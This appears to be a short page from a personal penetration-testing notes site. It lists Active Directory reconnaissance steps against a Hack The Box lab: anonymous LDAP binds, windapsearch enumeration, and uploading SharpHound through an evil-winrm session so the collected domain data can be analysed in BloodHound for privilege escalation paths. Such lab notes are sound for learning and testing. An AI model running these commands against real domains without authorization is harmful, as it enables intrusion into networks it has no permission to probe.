---
layout: default
title: Web
permalink: /Recon/AD/
---

## Check Anonymous Binds
```
ldapsearch -x -H ldap://$ip:389 -b "dc=$domain,dc=$tld"
```
download the latest windapsearch from `https://github.com/ropnop/windapsearch`
```
./windapsearch.py -d htb.local --dc-ip 10.129.95.210 -U
```
```
./windapsearch.py -d htb.local --dc-ip 10.129.95.210 --custom "objectClass=*"
```
## Bloodhound
Use SharpHound to collect data about the domain (usually installed on the attacker machine) and get Bloodhound to visalize the domain and look for privelege escalation paths.

If we have `evil-winrm` session open, we can upload with `upload SharpHound.exe` and run with `.\SharpHound.exe -c All`, then download the zip file with `download <id>_BloodHound.zip`. Then use can open Bloodhound with `bloodhound` (default credentials: neo4j:neo4j) and upload the zip file.
